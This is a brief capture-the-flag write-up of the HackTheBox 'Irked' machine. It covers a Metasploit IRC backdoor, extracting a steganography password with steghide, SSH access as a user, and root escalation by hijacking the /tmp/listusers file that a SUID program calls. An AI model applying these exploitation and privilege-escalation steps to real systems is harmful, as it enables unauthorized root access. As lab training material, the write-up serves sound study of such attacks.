Metasploit gives an IRC backdoor
There is a hidden password for a steg file that gives SSH credentials for user
SSH as djmardov gives user.txt

Sticky bit search shows a program that can be exploited to cat root.txt

Setting RHOSTS and RPORT gets us a shell!
RHOSTS:10.10.10.117
RPORT:6697

There is a user djmardov, but user.txt in Documents says Permission denied
There is a hidden .backup file

Super elite steg backup pw

This password corresponds to the irked.jpg at 10.10.10.117
ryann@kali:~/HackTheBox/Irked_117$ steghide extract -sf irked.jpg
Enter passphrase:
wrote extracted data to "pass.txt".
ryan@kali:~/HackTheBox/Irked_117$ cat pass.txt

We can now ssh into the server as djmardov with the supplied password
We can cat /home/djmardov/Documents/user.txt

djmardov@irked:~/Documents$ wc user.txt
 1  1 33 user.txt

Now to escalate privleges...
Looking for sticky bits shows an interesting utility
find / -perm -u=s -type f 2>/dev/null
/usr/bin/viewuser

djmardov@irked:~$ viewuser -h
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-02-08 23:12 (:0)
djmardov pts/0        2020-02-08 23:41 (10.10.14.2)
sh: 1: /tmp/listusers: not found

We can create /tmp/listusers and edit the file to have 777 permissions.
When we run the file, whatever it contains will be executed as root
Edit listusers:
cat /root/root.txt

Now, executing viewuser -h gives us the root password!

djmardov@irked:/tmp$ chmod 777 listusers 
djmardov@irked:/tmp$ viewuser -h
